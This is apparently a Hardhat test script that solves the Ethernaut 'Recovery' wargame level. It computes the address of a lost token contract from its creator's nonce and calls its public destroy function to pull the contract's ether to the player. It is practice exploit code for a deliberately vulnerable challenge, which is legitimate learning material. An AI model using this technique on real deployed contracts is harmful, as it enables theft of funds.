import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;
let challengeFactory: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  //const challengeFactory = await ethers.getContractFactory(`Recovery`);
  challengeFactory = await ethers.getContractFactory(`Recovery`);
  // Another mystery address. Not sure where Mr Toph got it from.
  const challengeAddress = await createChallenge(
    `0x8d07AC34D8f73e2892496c15223297e5B22B3ABE`
  );
  challenge = await challengeFactory.attach(challengeAddress);

  // Update this to match your attack contract
  //const attackerFactory = await ethers.getContractFactory(`CoinFlipAttacker`);
  //attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
    // address from ethernaut challenge website
    //const originalAddress = `0x0EB8e4771ABA41B70d0cb6770e04086E5aee5aB2`;
    const originalAddress = `0x8d07AC34D8f73e2892496c15223297e5B22B3ABE`;

    // THis is a built-in function from ethers that allows you to precompute
    // addresses that would be generated by a contract deploying other contracts
    // At first I tried re-implementing this on my own but it didn't really work out...
    // Source code/algorithm here: 
    // - https://github.com/ethers-io/ethers.js/blob/master/packages/address/src.ts/index.ts#L130
    const recomputedContractAddress = ethers.utils.getContractAddress({
          from: challenge.address,
          nonce: ethers.BigNumber.from(`1`),
    })

    // Attach to the second contract using the other contract factory
    const attackerFactory = await ethers.getContractFactory(`SimpleToken`);
    attacker = await attackerFactory.attach(recomputedContractAddress);
    tx = await attacker.destroy(await eoa.getAddress());
    await tx.wait();
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
